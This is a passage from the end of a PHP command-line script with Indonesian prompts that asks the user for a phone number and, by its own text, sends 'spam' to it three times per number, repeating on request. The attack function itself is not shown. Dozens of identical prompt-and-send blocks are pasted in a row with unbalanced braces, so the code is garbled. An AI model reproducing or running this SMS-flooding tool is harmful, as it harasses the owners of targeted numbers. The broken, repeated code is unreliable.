echo "\n\n\033[97m[\033[91m!\033[97m] \033[92mPROSES ..\n";
sleep(2);
$execute = send($nomor);
print $execute;

            }else{
                echo "\n\n\033[97m ~\033[95m══\033[97m~ \033[96mTERIMA KASIH TELAH MENGGUNAKAN TOOL INI\n";
                echo"\n";
                exit;
        }
echo "\033[97m[\033[92m?\033[97m] \033[92mingin mengulang\033[93m ?\n\033[97m[\033[92m?\033[97m] \033[92my\033[97m/\033[92mn \033[93m: ";
$pill = trim(fgets(STDIN));
if($pill == 'y') {
                   
       system('clear');
echo $banner;
echo "\n";
echo "\033[97m•\033[95m=\033[97m• \033[92mMasukkan Nomor\n\033[94m╔═\033[91m─────────────\033[94m═\033[97m[ \033[92m62\033[97m/\033[92m08 \033[97m]\033[94m═\033[91m─────────────\033[94m=\033[97m•\n\033[94m║\n\033[94m╚═\033[93m•\033[91m─\033[93m•\033[94m=\033[91m>\033[92m ";
$nomor = trim(fgets(STDIN));
sleep(1);
echo "\n\033[97m[\033[91m!\033[97m] \033[90mHANYA UNTUK 3 KALI SPAM DALAM 1 NOMOR\n    JIKA INGIN LAGI TUNGGU SEKITAR 1 JAM";
sleep(2);
echo "\n\n\033[97m[\033[91m!\033[97m] \033[92mPROSES ..\n";
sleep(2);
$execute = send($nomor);
print $execute;

            }else{
                echo "\n\n\033[97m ~\033[95m══\033[97m~ \033[96mTERIMA KASIH TELAH MENGGUNAKAN TOOL INI\n";
                echo"\n";
                exit;
        }
echo "\033[97m[\033[92m?\033[97m] \033[92mingin mengulang\033[93m ?\n\033[97m[\033[92m?\033[97m] \033[92my\033[97m/\033[92mn \033[93m: ";
$pill = trim(fgets(STDIN));
if($pill == 'y') {
                   
       system('clear');
echo $banner;
echo "\n";
echo "\033[97m•\033[95m=\033[97m• \033[92mMasukkan Nomor\n\033[94m╔═\033[91m─────────────\033[94m═\033[97m[ \033[92m62\033[97m/\033[92m08 \033[97m]\033[94m═\033[91m─────────────\033[94m=\033[97m•\n\033[94m║\n\033[94m╚═\033[93m•\033[91m─\033[93m•\033[94m=\033[91m>\033[92m ";
$nomor = trim(fgets(STDIN));
sleep(1);
echo "\n\033[97m[\033[91m!\033[97m] \033[90mHANYA UNTUK 3 KALI SPAM DALAM 1 NOMOR\n    JIKA INGIN LAGI TUNGGU SEKITAR 1 JAM";
sleep(2);
echo "\n\n\033[97m[\033[91m!\033[97m] \033[92mPROSES ..\n";
sleep(2);
$execute = send($nomor);
print $execute;

            }else{
                echo "\n\n\033[97m ~\033[95m══\033[97m~ \033[96mTERIMA KASIH TELAH MENGGUNAKAN TOOL INI\n";
                echo"\n";
                exit;
        }
echo "\033[97m[\033[92m?\033[97m] \033[92mingin mengulang\033[93m ?\n\033[97m[\033[92m?\033[97m] \033[92my\033[97m/\033[92mn \033[93m: ";
$pill = trim(fgets(STDIN));
if($pill == 'y') {
                   
       system('clear');
echo $banner;
echo "\n";
echo "\033[97m•\033[95m=\033[97m• \033[92mMasukkan Nomor\n\033[94m╔═\033[91m─────────────\033[94m═\033[97m[ \033[92m62\033[97m/\033[92m08 \033[97m]\033[94m═\033[91m─────────────\033[94m=\033[97m•\n\033[94m║\n\033[94m╚═\033[93m•\033[91m─\033[93m•\033[94m=\033[91m>\033[92m ";
$nomor = trim(fgets(STDIN));
sleep(1);
echo "\n\033[97m[\033[91m!\033[97m] \033[90mHANYA UNTUK 3 KALI SPAM DALAM 1 NOMOR\n    JIKA INGIN LAGI TUNGGU SEKITAR 1 JAM";
sleep(2);
echo "\n\n\033[97m[\033[91m!\033[97m] \033[92mPROSES ..\n";
sleep(2);
$execute = send($nomor);
print $execute;

            }else{
                echo "\n\n\033[97m ~\033[95m══\033[97m~ \033[96mTERIMA KASIH TELAH MENGGUNAKAN TOOL INI\n";
                echo"\n";
                exit;
        }
echo "\033[97m[\033[92m?\033[97m] \033[92mingin mengulang\033[93m ?\n\033[97m[\033[92m?\033[97m] \033[92my\033[97m/\033[92mn \033[93m: ";
$pill = trim(fgets(STDIN));
if($pill == 'y') {
                   
       system('clear');
echo $banner;
echo "\n";
echo "\033[97m•\033[95m=\033[97m• \033[92mMasukkan Nomor\n\033[94m╔═\033[91m─────────────\033[94m═\033[97m[ \033[92m62\033[97m/\033[92m08 \033[97m]\033[94m═\033[91m─────────────\033[94m=\033[97m•\n\033[94m║\n\033[94m╚═\033[93m•\033[91m─\033[93m•\033[94m=\033[91m>\033[92m ";
$nomor = trim(fgets(STDIN));
sleep(1);
echo "\n\033[97m[\033[91m!\033[97m] \033[90mHANYA UNTUK 3 KALI SPAM DALAM 1 NOMOR\n    JIKA INGIN LAGI TUNGGU SEKITAR 1 JAM";
sleep(2);
echo "\n\n\033[97m[\033[91m!\033[97m] \033[92mPROSES ..\n";
sleep(2);
$execute = send($nomor);
print $execute;

            }else{
                echo "\n\n\033[97m ~\033[95m══\033[97m~ \033[96mTERIMA KASIH TELAH MENGGUNAKAN TOOL INI\n";
                echo"\n";
                exit;
        }
echo "\033[97m[\033[92m?\033[97m] \033[92mingin mengulang\033[93m ?\n\033[97m[\033[92m?\033[97m] \033[92my\033[97m/\033[92mn \033[93m: ";
$pill = trim(fgets(STDIN));
if($pill == 'y') {
                   
       system('clear');
echo $banner;
echo "\n";
echo "\033[97m•\033[95m=\033[97m• \033[92mMasukkan Nomor\n\033[94m╔═\033[91m─────────────\033[94m═\033[97m[ \033[92m62\033[97m/\033[92m08 \033[97m]\033[94m═\033[91m─────────────\033[94m=\033[97m•\n\033[94m║\n\033[94m╚═\033[93m•\033[91m─\033[93m•\033[94m=\033[91m>\033[92m ";
$nomor = trim(fgets(STDIN));
sleep(1);
echo "\n\033[97m[\033[91m!\033[97m] \033[90mHANYA UNTUK 3 KALI SPAM DALAM 1 NOMOR\n    JIKA INGIN LAGI TUNGGU SEKITAR 1 JAM";
sleep(2);
echo "\n\n\033[97m[\033[91m!\033[97m] \033[92mPROSES ..\n";
sleep(2);
$execute = send($nomor);
print $execute;

            }else{
                echo "\n\n\033[97m ~\033[95m══\033[97m~ \033[96mTERIMA KASIH TELAH MENGGUNAKAN TOOL INI\n";
                echo"\n";
                exit;
        }
echo "\033[97m[\033[92m?\033[97m] \033[92mingin mengulang\033[93m ?\n\033[97m[\033[92m?\033[97m] \033[92my\033[97m/\033[92mn \033[93m: ";
$pill = trim(fgets(STDIN));
if($pill == 'y') {
                   
       system('clear');
echo $banner;
echo "\n";
echo "\033[97m•\033[95m=\033[97m• \033[92mMasukkan Nomor\n\033[94m╔═\033[91m─────────────\033[94m═\033[97m[ \033[92m62\033[97m/\033[92m08 \033[97m]\033[94m═\033[91m─────────────\033[94m=\033[97m•\n\033[94m║\n\033[94m╚═\033[93m•\033[91m─\033[93m•\033[94m=\033[91m>\033[92m ";
$nomor = trim(fgets(STDIN));
sleep(1);
echo "\n\033[97m[\033[91m!\033[97m] \033[90mHANYA UNTUK 3 KALI SPAM DALAM 1 NOMOR\n    JIKA INGIN LAGI TUNGGU SEKITAR 1 JAM";
sleep(2);
echo "\n\n\033[97m[\033[91m!\033[97m] \033[92mPROSES ..\n";
sleep(2);
$execute = send($nomor);
print $execute;

            }else{
                echo "\n\n\033[97m ~\033[95m══\033[97m~ \033[96mTERIMA KASIH TELAH MENGGUNAKAN TOOL INI\n";
                echo"\n";
                exit;
        }
echo "\033[97m[\033[92m?\033[97m] \033[92mingin mengulang\033[93m ?\n\033[97m[\033[92m?\033[97m] \033[92my\033[97m/\033[92mn \033[93m: ";
$pill = trim(fgets(STDIN));
if($pill == 'y') {
                   
       system('clear');
echo $banner;
echo "\n";
echo "\033[97m•\033[95m=\033[97m• \033[92mMasukkan Nomor\n\033[94m╔═\033[91m─────────────\033[94m═\033[97m[ \033[92m62\033[97m/\033[92m08 \033[97m]\033[94m═\033[91m─────────────\033[94m=\033[97m•\n\033[94m║\n\033[94m╚═\033[93m•\033[91m─\033[93m•\033[94m=\033[91m>\033[92m ";
$nomor = trim(fgets(STDIN));
sleep(1);
echo "\n\033[97m[\033[91m!\033[97m] \033[90mHANYA UNTUK 3 KALI SPAM DALAM 1 NOMOR\n    JIKA INGIN LAGI TUNGGU SEKITAR 1 JAM";
sleep(2);
echo "\n\n\033[97m[\033[91m!\033[97m] \033[92mPROSES ..\n";
sleep(2);
$execute = send($nomor);
print $execute;

            }else{
                echo "\n\n\033[97m ~\033[95m══\033[97m~ \033[96mTERIMA KASIH TELAH MENGGUNAKAN TOOL INI\n";
                echo"\n";
                exit;
        }
echo "\033[97m[\033[92m?\033[97m] \033[92mingin mengulang\033[93m ?\n\033[97m[\033[92m?\033[97m] \033[92my\033[97m/\033[92mn \033[93m: ";
$pill = trim(fgets(STDIN));
if($pill == 'y') {
                   
       system('clear');
echo $banner;
echo "\n";
echo "\033[97m•\033[95m=\033[97m• \033[92mMasukkan Nomor\n\033[94m╔═\033[91m─────────────\033[94m═\033[97m[ \033[92m62\033[97m/\033[92m08 \033[97m]\033[94m═\033[91m─────────────\033[94m=\033[97m•\n\033[94m║\n\033[94m╚═\033[93m•\033[91m─\033[93m•\033[94m=\033[91m>\033[92m ";
$nomor = trim(fgets(STDIN));
sleep(1);
echo "\n\033[97m[\033[91m!\033[97m] \033[90mHANYA UNTUK 3 KALI SPAM DALAM 1 NOMOR\n    JIKA INGIN LAGI TUNGGU SEKITAR 1 JAM";
sleep(2);
echo "\n\n\033[97m[\033[91m!\033[97m] \033[92mPROSES ..\n";
sleep(2);
$execute = send($nomor);
print $execute;

            }else{
                echo "\n\n\033[97m ~\033[95m══\033[97m~ \033[96mTERIMA KASIH TELAH MENGGUNAKAN TOOL INI\n";
                echo"\n";
                exit;
        }
echo "\033[97m[\033[92m?\033[97m] \033[92mingin mengulang\033[93m ?\n\033[97m[\033[92m?\033[97m] \033[92my\033[97m/\033[92mn \033[93m: ";
$pill = trim(fgets(STDIN));
if($pill == 'y') {
                   
       system('clear');
echo $banner;
echo "\n";
echo "\033[97m•\033[95m=\033[97m• \033[92mMasukkan Nomor\n\033[94m╔═\033[91m─────────────\033[94m═\033[97m[ \033[92m62\033[97m/\033[92m08 \033[97m]\033[94m═\033[91m─────────────\033[94m=\033[97m•\n\033[94m║\n\033[94m╚═\033[93m•\033[91m─\033[93m•\033[94m=\033[91m>\033[92m ";
$nomor = trim(fgets(STDIN));
sleep(1);
echo "\n\033[97m[\033[91m!\033[97m] \033[90mHANYA UNTUK 3 KALI SPAM DALAM 1 NOMOR\n    JIKA INGIN LAGI TUNGGU SEKITAR 1 JAM";
sleep(2);
echo "\n\n\033[97m[\033[91m!\033[97m] \033[92mPROSES ..\n";
sleep(2);
$execute = send($nomor);
print $execute;

            }else{
                echo "\n\n\033[97m ~\033[95m══\033[97m~ \033[96mTERIMA KASIH TELAH MENGGUNAKAN TOOL INI\n";
                echo"\n";
                exit;
        }
echo "\033[97m[\033[92m?\033[97m] \033[92mingin mengulang\033[93m ?\n\033[97m[\033[92m?\033[97m] \033[92my\033[97m/\033[92mn \033[93m: ";
$pill = trim(fgets(STDIN));
if($pill == 'y') {
                   
       system('clear');
echo $banner;
echo "\n";
echo "\033[97m•\033[95m=\033[97m• \033[92mMasukkan Nomor\n\033[94m╔═\033[91m─────────────\033[94m═\033[97m[ \033[92m62\033[97m/\033[92m08 \033[97m]\033[94m═\033[91m─────────────\033[94m=\033[97m•\n\033[94m║\n\033[94m╚═\033[93m•\033[91m─\033[93m•\033[94m=\033[91m>\033[92m ";
$nomor = trim(fgets(STDIN));
sleep(1);
echo "\n\033[97m[\033[91m!\033[97m] \033[90mHANYA UNTUK 3 KALI SPAM DALAM 1 NOMOR\n    JIKA INGIN LAGI TUNGGU SEKITAR 1 JAM";
sleep(2);
echo "\n\n\033[97m[\033[91m!\033[97m] \033[92mPROSES ..\n";
sleep(2);
$execute = send($nomor);
print $execute;

            }else{
                echo "\n\n\033[97m ~\033[95m══\033[97m~ \033[96mTERIMA KASIH TELAH MENGGUNAKAN TOOL INI\n";
                echo"\n";
                exit;
        }
echo "\033[97m[\033[92m?\033[97m] \033[92mingin mengulang\033[93m ?\n\033[97m[\033[92m?\033[97m] \033[92my\033[97m/\033[92mn \033[93m: ";
$pill = trim(fgets(STDIN));
if($pill == 'y') {
                   
       system('clear');
echo $banner;
echo "\n";
echo "\033[97m•\033[95m=\033[97m• \033[92mMasukkan Nomor\n\033[94m╔═\033[91m─────────────\033[94m═\033[97m[ \033[92m62\033[97m/\033[92m08 \033[97m]\033[94m═\033[91m─────────────\033[94m=\033[97m•\n\033[94m║\n\033[94m╚═\033[93m•\033[91m─\033[93m•\033[94m=\033[91m>\033[92m ";
$nomor = trim(fgets(STDIN));
sleep(1);
echo "\n\033[97m[\033[91m!\033[97m] \033[90mHANYA UNTUK 3 KALI SPAM DALAM 1 NOMOR\n    JIKA INGIN LAGI TUNGGU SEKITAR 1 JAM";
sleep(2);
echo "\n\n\033[97m[\033[91m!\033[97m] \033[92mPROSES ..\n";
sleep(2);
$execute = send($nomor);
print $execute;

            }else{
                echo "\n\n\033[97m ~\033[95m══\033[97m~ \033[96mTERIMA KASIH TELAH MENGGUNAKAN TOOL INI\n";
                echo"\n";
                exit;
        }
echo "\033[97m[\033[92m?\033[97m] \033[92mingin mengulang\033[93m ?\n\033[97m[\033[92m?\033[97m] \033[92my\033[97m/\033[92mn \033[93m: ";
$pill = trim(fgets(STDIN));
if($pill == 'y') {
                   
       system('clear');
echo $banner;
echo "\n";
echo "\033[97m•\033[95m=\033[97m• \033[92mMasukkan Nomor\n\033[94m╔═\033[91m─────────────\033[94m═\033[97m[ \033[92m62\033[97m/\033[92m08 \033[97m]\033[94m═\033[91m─────────────\033[94m=\033[97m•\n\033[94m║\n\033[94m╚═\033[93m•\033[91m─\033[93m•\033[94m=\033[91m>\033[92m ";
$nomor = trim(fgets(STDIN));
sleep(1);
echo "\n\033[97m[\033[91m!\033[97m] \033[90mHANYA UNTUK 3 KALI SPAM DALAM 1 NOMOR\n    JIKA INGIN LAGI TUNGGU SEKITAR 1 JAM";
sleep(2);
echo "\n\n\033[97m[\033[91m!\033[97m] \033[92mPROSES ..\n";
sleep(2);
$execute = send($nomor);
print $execute;

            }else{
                echo "\n\n\033[97m ~\033[95m══\033[97m~ \033[96mTERIMA KASIH TELAH MENGGUNAKAN TOOL INI\n";
                echo"\n";
                exit;
        }
echo "\033[97m[\033[92m?\033[97m] \033[92mingin mengulang\033[93m ?\n\033[97m[\033[92m?\033[97m] \033[92my\033[97m/\033[92mn \033[93m: ";
$pill = trim(fgets(STDIN));
if($pill == 'y') {
                   
       system('clear');
echo $banner;
echo "\n";
echo "\033[97m•\033[95m=\033[97m• \033[92mMasukkan Nomor\n\033[94m╔═\033[91m─────────────\033[94m═\033[97m[ \033[92m62\033[97m/\033[92m08 \033[97m]\033[94m═\033[91m─────────────\033[94m=\033[97m•\n\033[94m║\n\033[94m╚═\033[93m•\033[91m─\033[93m•\033[94m=\033[91m>\033[92m ";
$nomor = trim(fgets(STDIN));
sleep(1);
echo "\n\033[97m[\033[91m!\033[97m] \033[90mHANYA UNTUK 3 KALI SPAM DALAM 1 NOMOR\n    JIKA INGIN LAGI TUNGGU SEKITAR 1 JAM";
sleep(2);
echo "\n\n\033[97m[\033[91m!\033[97m] \033[92mPROSES ..\n";
sleep(2);
$execute = send($nomor);
print $execute;

            }else{
                echo "\n\n\033[97m ~\033[95m══\033[97m~ \033[96mTERIMA KASIH TELAH MENGGUNAKAN TOOL INI\n";
                echo"\n";
                exit;
        }
echo "\033[97m[\033[92m?\033[97m] \033[92mingin mengulang\033[93m ?\n\033[97m[\033[92m?\033[97m] \033[92my\033[97m/\033[92mn \033[93m: ";
$pill = trim(fgets(STDIN));
if($pill == 'y') {
                   
       system('clear');
echo $banner;
echo "\n";
echo "\033[97m•\033[95m=\033[97m• \033[92mMasukkan Nomor\n\033[94m╔═\033[91m─────────────\033[94m═\033[97m[ \033[92m62\033[97m/\033[92m08 \033[97m]\033[94m═\033[91m─────────────\033[94m=\033[97m•\n\033[94m║\n\033[94m╚═\033[93m•\033[91m─\033[93m•\033[94m=\033[91m>\033[92m ";
$nomor = trim(fgets(STDIN));
sleep(1);
echo "\n\033[97m[\033[91m!\033[97m] \033[90mHANYA UNTUK 3 KALI SPAM DALAM 1 NOMOR\n    JIKA INGIN LAGI TUNGGU SEKITAR 1 JAM";
sleep(2);
echo "\n\n\033[97m[\033[91m!\033[97m] \033[92mPROSES ..\n";
sleep(2);
$execute = send($nomor);
print $execute;

            }else{
                echo "\n\n\033[97m ~\033[95m══\033[97m~ \033[96mTERIMA KASIH TELAH MENGGUNAKAN TOOL INI\n";
                echo"\n";
                exit;
        }
echo "\033[97m[\033[92m?\033[97m] \033[92mingin mengulang\033[93m ?\n\033[97m[\033[92m?\033[97m] \033[92my\033[97m/\033[92mn \033[93m: ";
$pill = trim(fgets(STDIN));
if($pill == 'y') {
                   
       system('clear');
echo $banner;
echo "\n";
echo "\033[97m•\033[95m=\033[97m• \033[92mMasukkan Nomor\n\033[94m╔═\033[91m─────────────\033[94m═\033[97m[ \033[92m62\033[97m/\033[92m08 \033[97m]\033[94m═\033[91m─────────────\033[94m=\033[97m•\n\033[94m║\n\033[94m╚═\033[93m•\033[91m─\033[93m•\033[94m=\033[91m>\033[92m ";
$nomor = trim(fgets(STDIN));
sleep(1);
echo "\n\033[97m[\033[91m!\033[97m] \033[90mHANYA UNTUK 3 KALI SPAM DALAM 1 NOMOR\n    JIKA INGIN LAGI TUNGGU SEKITAR 1 JAM";
sleep(2);
echo "\n\n\033[97m[\033[91m!\033[97m] \033[92mPROSES ..\n";
sleep(2);
$execute = send($nomor);
print $execute;

            }else{
                echo "\n\n\033[97m ~\033[95m══\033[97m~ \033[96mTERIMA KASIH TELAH MENGGUNAKAN TOOL INI\n";
                echo"\n";
                exit;
        }
echo "\033[97m[\033[92m?\033[97m] \033[92mingin mengulang\033[93m ?\n\033[97m[\033[92m?\033[97m] \033[92my\033[97m/\033[92mn \033[93m: ";
$pill = trim(fgets(STDIN));
if($pill == 'y') {
                   
       system('clear');
echo $banner;
echo "\n";
echo "\033[97m•\033[95m=\033[97m• \033[92mMasukkan Nomor\n\033[94m╔═\033[91m─────────────\033[94m═\033[97m[ \033[92m62\033[97m/\033[92m08 \033[97m]\033[94m═\033[91m─────────────\033[94m=\033[97m•\n\033[94m║\n\033[94m╚═\033[93m•\033[91m─\033[93m•\033[94m=\033[91m>\033[92m ";
$nomor = trim(fgets(STDIN));
sleep(1);
echo "\n\033[97m[\033[91m!\033[97m] \033[90mHANYA UNTUK 3 KALI SPAM DALAM 1 NOMOR\n    JIKA INGIN LAGI TUNGGU SEKITAR 1 JAM";
sleep(2);
echo "\n\n\033[97m[\033[91m!\033[97m] \033[92mPROSES ..\n";
sleep(2);
$execute = send($nomor);
print $execute;

            }else{
                echo "\n\n\033[97m ~\033[95m══\033[97m~ \033[96mTERIMA KASIH TELAH MENGGUNAKAN TOOL INI\n";
                echo"\n";
                exit;
        }
echo "\033[97m[\033[92m?\033[97m] \033[92mingin mengulang\033[93m ?\n\033[97m[\033[92m?\033[97m] \033[92my\033[97m/\033[92mn \033[93m: ";
$pill = trim(fgets(STDIN));
if($pill == 'y') {
                   
       system('clear');
echo $banner;
echo "\n";
echo "\033[97m•\033[95m=\033[97m• \033[92mMasukkan Nomor\n\033[94m╔═\033[91m─────────────\033[94m═\033[97m[ \033[92m62\033[97m/\033[92m08 \033[97m]\033[94m═\033[91m─────────────\033[94m=\033[97m•\n\033[94m║\n\033[94m╚═\033[93m•\033[91m─\033[93m•\033[94m=\033[91m>\033[92m ";
$nomor = trim(fgets(STDIN));
sleep(1);
echo "\n\033[97m[\033[91m!\033[97m] \033[90mHANYA UNTUK 3 KALI SPAM DALAM 1 NOMOR\n    JIKA INGIN LAGI TUNGGU SEKITAR 1 JAM";
sleep(2);
echo "\n\n\033[97m[\033[91m!\033[97m] \033[92mPROSES ..\n";
sleep(2);
$execute = send($nomor);
print $execute;

            }else{
                echo "\n\n\033[97m ~\033[95m══\033[97m~ \033[96mTERIMA KASIH TELAH MENGGUNAKAN TOOL INI\n";
                echo"\n";
                exit;
        }
echo "\033[97m[\033[92m?\033[97m] \033[92mingin mengulang\033[93m ?\n\033[97m[\033[92m?\033[97m] \033[92my\033[97m/\033[92mn \033[93m: ";
$pill = trim(fgets(STDIN));
if($pill == 'y') {
                   
       system('clear');
echo $banner;
echo "\n";
echo "\033[97m•\033[95m=\033[97m• \033[92mMasukkan Nomor\n\033[94m╔═\033[91m─────────────\033[94m═\033[97m[ \033[92m62\033[97m/\033[92m08 \033[97m]\033[94m═\033[91m─────────────\033[94m=\033[97m•\n\033[94m║\n\033[94m╚═\033[93m•\033[91m─\033[93m•\033[94m=\033[91m>\033[92m ";
$nomor = trim(fgets(STDIN));
sleep(1);
echo "\n\033[97m[\033[91m!\033[97m] \033[90mHANYA UNTUK 3 KALI SPAM DALAM 1 NOMOR\n    JIKA INGIN LAGI TUNGGU SEKITAR 1 JAM";
sleep(2);
echo "\n\n\033[97m[\033[91m!\033[97m] \033[92mPROSES ..\n";
sleep(2);
$execute = send($nomor);
print $execute;

            }else{
                echo "\n\n\033[97m ~\033[95m══\033[97m~ \033[96mTERIMA KASIH TELAH MENGGUNAKAN TOOL INI\n";
                echo"\n";
                exit;
        }
?>
                   
       